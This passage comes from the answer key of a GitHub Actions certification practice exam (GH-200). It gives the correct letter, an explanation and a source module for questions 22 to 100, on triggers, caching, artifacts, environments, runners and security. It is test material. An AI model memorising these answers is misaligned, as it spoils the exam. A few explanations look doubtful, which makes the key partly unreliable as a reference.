| 22 | B | `permissions: read-all` at the workflow level sets the default; individual jobs can then override with explicit `permissions:` blocks granting only the write access they need. | 04-Workflow-File-Structure.md | Medium |
| 23 | B | Without specifying `types:`, `on: pull_request:` defaults to triggering on `opened`, `synchronize`, and `reopened` activity types. | 05-Workflow-Trigger-Events.md | Easy |
| 24 | B | `on: push: tags: ["*"]` fires on any tag push regardless of naming convention. The `*` glob matches any tag name. | 05-Workflow-Trigger-Events.md | Medium |
| 25 | B | When a `workflow_dispatch` input has a `default:` value and the caller omits the input, the default is used. `inputs.log-level` will equal `info`. | 05-Workflow-Trigger-Events.md | Medium |
| 26 | D | `branches: [main, "release/**"]` uses the double-star glob to match `release/` followed by anything; `"release/*"` only matches one directory level. | 05-Workflow-Trigger-Events.md | Medium |
| 27 | C | `workflow_run` trigger with `types: [completed]` fires for any conclusion; adding `if: github.event.workflow_run.conclusion == 'success'` on the job restricts execution to successful upstream runs. | 05-Workflow-Trigger-Events.md | Medium |
| 28 | B | GitHub Actions cron schedules run in UTC. `0 13 * * *` triggers at 13:00 UTC daily, which corresponds to 8:00 AM UTC-5. | 05-Workflow-Trigger-Events.md | Medium |
| 29 | B | Merging a PR creates a new commit pushed to `main`, triggering a `push` event. The PR is closed by the merge, but `pull_request` workflows only fire for PR-specific events (opened, synchronize, reopened, closed) — and `closed` requires explicitly listing it in `types:`. Workflow B (without `types: [closed]`) does not fire. | 05-Workflow-Trigger-Events.md | Hard |
| 30 | B | Custom environment variables at any scope (workflow, job, step) are injected into the runner's OS environment, making them accessible as `$BUILD_MODE` in bash without any special syntax. | 06-Custom-Environment-Variables.md | Easy |
| 31 | C | Step-level `env:` is the most specific scope and overrides both job-level and workflow-level values for the same variable name. `$DEBUG` equals `verbose`. | 06-Custom-Environment-Variables.md | Medium |
| 32 | B | `echo "RELEASE_TAG=$(git describe --tags)" >> $GITHUB_ENV` writes the variable to the `GITHUB_ENV` file, making it available in all subsequent steps. | 06-Custom-Environment-Variables.md | Medium |
| 33 | B | Mapping secrets to step-level `env:` variables (`env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`) and referencing `$NPM_TOKEN` in the command follows the recommended security practice. | 06-Custom-Environment-Variables.md | Medium |
| 34 | B | The `env` context IS available in `steps[*].with:` as `${{ env.APP_VERSION }}`; in `run:` steps the value is also accessible as the shell variable `$APP_VERSION`. | 06-Custom-Environment-Variables.md | Medium |
| 35 | C | `GITHUB_WORKSPACE` contains the absolute path to the directory where the repository is checked out on the runner. | 07-Default-Environment-Variables.md | Easy |
| 36 | A | `GITHUB_REF_TYPE` has two possible values: `branch` and `tag`. A value of `tag` indicates the workflow was triggered by a tag push. | 07-Default-Environment-Variables.md | Medium |
| 37 | B | `RUNNER_OS` is the correct variable, containing `Linux`, `Windows`, or `macOS` on all runner types (hosted and self-hosted). | 07-Default-Environment-Variables.md | Medium |
| 38 | B | `GITHUB_API_URL` is automatically set to the correct REST API base URL for the instance (github.com or GHES), ensuring portability without hard-coding. | 07-Default-Environment-Variables.md | Medium |
| 39 | B | `GITHUB_JOB` contains the job's ID as defined in the workflow YAML (e.g., the key under `jobs:`), useful for telemetry and logging. | 07-Default-Environment-Variables.md | Medium |
| 40 | B | GitHub allows up to 6 reviewers (individual users or teams) to be configured as required reviewers for an environment. | 08-Environment-Protection-Rules.md | Easy |
| 41 | B | GitHub prevents self-review by default — the user who triggered the workflow run cannot approve their own deployment through the required reviewer gate. | 08-Environment-Protection-Rules.md | Medium |
| 42 | B | Environment-scoped secrets are injected into jobs that declare that specific environment. They take precedence over repository-level secrets with the same name. | 08-Environment-Protection-Rules.md | Medium |
| 43 | B | "Protected Branches Only" automatically restricts deployments to branches that have branch protection rules configured, without requiring manual branch name listing. | 08-Environment-Protection-Rules.md | Medium |
| 44 | B | GitHub sends email notifications and in-app notifications to required reviewers when a deployment awaits approval; they can also see pending deployments on their GitHub notifications page. | 08-Environment-Protection-Rules.md | Medium |
| 45 | B | Artifact names must be unique within a workflow run. Uploading a second artifact with the same name overwrites the first — use distinct names per job to avoid data loss. | 09-Workflow-Artifacts.md | Easy |
| 46 | B | When no `path:` is specified in `download-artifact`, files are placed in a subdirectory named after the artifact (e.g., `./build-output/`) in the current working directory. | 09-Workflow-Artifacts.md | Medium |
| 47 | B | The maximum retention is set by admin configuration (up to 90 days free / 400 days paid). If the specified `retention-days` exceeds the configured maximum, the maximum is silently applied. | 09-Workflow-Artifacts.md | Medium |
| 48 | B | Both test jobs upload artifacts; the coverage job uses `needs: [test-unit, test-integration]` to wait for both, then downloads each artifact set and combines them. | 09-Workflow-Artifacts.md | Medium |
| 49 | B | Artifacts within their retention period are accessible via Repository → Actions → [workflow run] → Artifacts section at the bottom of the run summary page. | 09-Workflow-Artifacts.md | Medium |
| 50 | B | The `if-no-files-found` input controls behavior when the path pattern matches nothing. Setting it to `ignore` causes the upload step to succeed silently when no files match. | 09-Workflow-Artifacts.md | Medium |
| 51 | C | A cache created on `feature/login` is directly accessible by that branch; other branches cannot access it directly, but any branch can fall back to the default branch's cache if their own key misses. | 10-Workflow-Caching.md | Easy |
| 52 | B | `hashFiles('requirements.txt', 'constraints.txt')` computes a single combined hash of both files, invalidating the cache if either file changes. | 10-Workflow-Caching.md | Medium |
| 53 | B | `actions/cache@v3` registers a post-job step that runs after all other steps (even on failure) and saves the cache if the cache restore step ran — ensuring dependencies installed after a cache miss are cached for future runs. | 10-Workflow-Caching.md | Medium |
| 54 | A | `DELETE /repos/{owner}/{repo}/actions/caches?key={key}` deletes cache entries matching a specific key. The `cache_id` form also works but requires knowing the numeric ID. | 10-Workflow-Caching.md | Medium |
| 55 | B | `actions/setup-node@v3` with `cache: 'npm'` enables built-in npm caching using the lock file hash automatically, without a separate `actions/cache` step. | 10-Workflow-Caching.md | Medium |
| 56 | B | GitHub Actions compresses cache entries (using zstd compression) before storing them, which is why a 1.8 GB `node_modules` directory is stored as ~400 MB. | 10-Workflow-Caching.md | Medium |
| 57 | B | Reusable workflows must be in `.github/workflows/` of a repository and use `on: workflow_call:` as their trigger to be callable from other workflows. | 11-Workflow-Sharing.md | Easy |
| 58 | B | GitHub Actions supports up to 4 levels of reusable workflow nesting (the caller plus 3 levels of called reusable workflows). | 11-Workflow-Sharing.md | Medium |
| 59 | B | For a private repository's reusable workflows to be callable cross-repo within an org, the repository must be set to `internal` visibility or explicitly configured to allow access from other repositories under Settings → Actions → Access. | 11-Workflow-Sharing.md | Medium |
| 60 | B | Reusable workflows must explicitly declare outputs under `on: workflow_call: outputs:` with `value:` referencing job outputs; this surfaces them to callers via the `needs` context. | 11-Workflow-Sharing.md | Medium |
| 61 | B | Enterprise required workflow results appear as standard PR status checks that cannot be bypassed by repository owners — they are enforced at enterprise level regardless of repository settings. | 11-Workflow-Sharing.md | Medium |
| 62 | B | `secrets: inherit` passes caller secrets to the directly called workflow only (A → B). Workflow B calling C is a separate call and must also pass or inherit secrets explicitly for C to have access. | 11-Workflow-Sharing.md | Hard |
| 63 | B | The GitHub UI "Re-run failed jobs" dialog includes an "Enable debug logging" checkbox that activates `ACTIONS_STEP_DEBUG` for the re-run without modifying workflow files or secrets permanently. | 12-Workflow-Debugging.md | Easy |
| 64 | B | `echo "::group::Title"` and `echo "::endgroup::"` create collapsible log groups in the GitHub Actions UI, folding the enclosed log lines under the specified title. | 12-Workflow-Debugging.md | Medium |
| 65 | B | `echo "::notice::message"` creates a blue informational annotation in the GitHub UI — distinct from `::warning::` (yellow) and `::error::` (red). | 12-Workflow-Debugging.md | Medium |
| 66 | D | Both approaches work. `echo '${{ toJSON(github) }}'` uses direct interpolation (single quotes prevent shell interpretation). Mapping to `env: GITHUB_CONTEXT: ${{ toJSON(github) }}` then `echo "$GITHUB_CONTEXT"` is preferred for multi-line JSON formatting. | 12-Workflow-Debugging.md | Medium |
| 67 | B | `outcome` reflects the actual step result (`failure`); `conclusion` reflects the effective result after `continue-on-error` processing (`success`). Use `outcome` to detect actual failures when `continue-on-error: true` is set. | 12-Workflow-Debugging.md | Medium |
| 68 | B | `GET /repos/{owner}/{repo}/actions/workflows` returns all workflow files with their IDs, names, file paths, states, and related URLs. | 13-Workflows-REST-API.md | Easy |
| 69 | B | `GET /repos/{owner}/{repo}/actions/runs/{run_id}` retrieves the full details of a specific workflow run including status, conclusion, timing, and links to jobs. | 13-Workflows-REST-API.md | Medium |
| 70 | B | `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` returns a redirect to a zip archive of all logs for the specified workflow run. | 13-Workflows-REST-API.md | Medium |
| 71 | A | `GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs` returns all jobs for a workflow run including job name, runner, step details, and timing information. | 13-Workflows-REST-API.md | Medium |
| 72 | B | The GitHub API validates required dispatch inputs and returns `422 Unprocessable Entity` when a required input is missing from the request body. | 13-Workflows-REST-API.md | Medium |
| 73 | C | GitHub does not impose an automatic timeout on pending deployment approvals — they wait indefinitely until a reviewer explicitly approves or rejects, or the workflow is cancelled. | 14-Reviewing-Deployments.md | Easy |
| 74 | A | When a reviewer rejects a deployment, the workflow job fails with a rejected status and all remaining steps in that job are skipped. | 14-Reviewing-Deployments.md | Medium |
| 75 | B | Each environment's protection rules are evaluated independently when the workflow job targets that environment. Staging approval does not carry over to production — a separate approval is required. | 14-Reviewing-Deployments.md | Medium |
| 76 | B | The repository's Deployments page (shown in the Environments section on the repository home) provides an environment-specific deployment history with approver, branch, commit, status, and links to workflow runs. | 14-Reviewing-Deployments.md | Medium |
| 77 | B | GitHub does not provide a direct admin bypass for Required Reviewers. Emergency options include the admin temporarily adding/removing themselves as a reviewer, or adding a new emergency reviewer to the environment. Removing the `environment:` key from a committed workflow file would also bypass the gate but requires a commit. | 14-Reviewing-Deployments.md | Medium |
| 78 | A | `runs: using: composite` with a nested `steps:` array is the correct declaration for a composite action in `action.yml`. | 15-Creating-Publishing-Actions.md | Easy |
| 79 | B | `runs: using: node20 main: index.js post: cleanup.js` designates `cleanup.js` as the post-execution script that runs automatically after the main step, regardless of success or failure. | 15-Creating-Publishing-Actions.md | Medium |
| 80 | A | Publishing to the GitHub Marketplace requires the repository to be public, have a valid `action.yml` at the root, and use the "Publish this Action to the GitHub Marketplace" option when creating a Release. | 15-Creating-Publishing-Actions.md | Medium |
| 81 | A | `runs: using: docker image: docker://myorg/my-action:latest` uses the `docker://` URI scheme to reference a pre-built image from Docker Hub or another registry. | 15-Creating-Publishing-Actions.md | Medium |
| 82 | B | `required: false default: "30"` makes the input optional with a fallback value. When omitted by the caller, `core.getInput('timeout-seconds')` returns `"30"`. | 15-Creating-Publishing-Actions.md | Medium |
| 83 | B | Version tags are mutable — they can be moved to point to different commits. Pinning to a full commit SHA guarantees the exact, immutable code version is always used, preventing supply chain attacks where a tag is silently updated to malicious code. | 15-Creating-Publishing-Actions.md | Medium |
| 84 | B | Standard GitHub-hosted `ubuntu-latest` runners have 2 CPUs and 7 GB of RAM (plus 14 GB SSD storage, 1 Gbps network). | 16-Managing-Runners.md | Easy |
| 85 | B | Configuring the runner with `./config.sh --ephemeral` causes it to accept exactly one job and then deregister, ensuring a completely clean environment for every job. | 16-Managing-Runners.md | Medium |
| 86 | B | Actions Runner Controller (ARC) is the Kubernetes operator project for running and auto-scaling GitHub Actions self-hosted runners as Kubernetes pods. | 16-Managing-Runners.md | Medium |
| 87 | B | Pre-installed tools are stored in the tool cache directory referenced by `RUNNER_TOOL_CACHE`. The `actions/setup-*` actions install specific versions here and prepend the version's `bin/` directory to `PATH`. | 16-Managing-Runners.md | Medium |
| 88 | B | Enterprise-level runner groups are managed by enterprise admins; organization admins can manage access within their organization's scope but cannot add repositories from other organizations. | 16-Managing-Runners.md | Medium |
| 89 | B | GitHub Actions can be disabled for a specific repository at the repository level under Settings → Actions → General → Actions permissions → Disable Actions for this repository. | 17-GitHub-Actions-Enterprise.md | Easy |
| 90 | B | In air-gapped GHES environments, self-hosted runners communicate with the GHES instance rather than github.com; Marketplace actions must be mirrored locally since outbound internet is blocked. | 17-GitHub-Actions-Enterprise.md | Medium |
| 91 | B | The Organization or Enterprise Audit log records Actions events (workflow triggered, deployment approved, etc.) including the actor and source IP address for compliance investigations. | 17-GitHub-Actions-Enterprise.md | Medium |
| 92 | B | Enterprise secrets are configured at the enterprise level and are available to workflows across all organizations and repositories within the enterprise, without per-org/repo setup. | 17-GitHub-Actions-Enterprise.md | Medium |
| 93 | B | Enterprise administrators set fork PR workflow approval policies in Enterprise Settings → Policies → Actions, which applies uniformly to all organizations in the enterprise, overriding individual org settings. | 17-GitHub-Actions-Enterprise.md | Medium |
| 94 | B | `permissions: contents: read issues: write` grants exactly the two required scopes — read access to repository contents and write access to issues — following least-privilege. | 18-Security-and-Optimization.md | Medium |
| 95 | B | OIDC token requests require `id-token: write` permission on the requesting job. Setting `read-all` at workflow level does not include `id-token: write`, causing the credentials step to fail. | 18-Security-and-Optimization.md | Medium |
| 96 | D | Both the web UI approach (B) and the API approach (C) are valid for verifying a tag SHA: B is practical for individual verification; C is scriptable for automated compliance pipelines. Both are recommended. | 18-Security-and-Optimization.md | Hard |
| 97 | B | `github.event.issue.title` is attacker-controlled input directly interpolated into a shell command, enabling command injection via crafted issue titles. Mitigation: assign to an env var first to prevent shell interpretation of the raw value. | 18-Security-and-Optimization.md | Hard |
| 98 | B | "No runner matching labels" means no currently online self-hosted runner has all the required labels. Verify the runner is online, registered, and has the correct labels configured. | 19-Common-Failures-Troubleshooting.md | Easy |
| 99 | B | If a `requirements.txt` file is being regenerated by an earlier workflow step (e.g., a lock file update command), the file content differs from what was present at cache key computation time, causing hash changes on every run. | 19-Common-Failures-Troubleshooting.md | Medium |
| 100 | B | `cancel-in-progress: false` preserves queued runs, which is correct for deployment ordering but causes queue growth under high commit frequency. Switching to `cancel-in-progress: true` ensures only the newest run proceeds, discarding intermediate queued runs and preventing backlog buildup. | 19-Common-Failures-Troubleshooting.md | Hard |

---

*End of GH-200 Iteration 10 — 100 Questions*
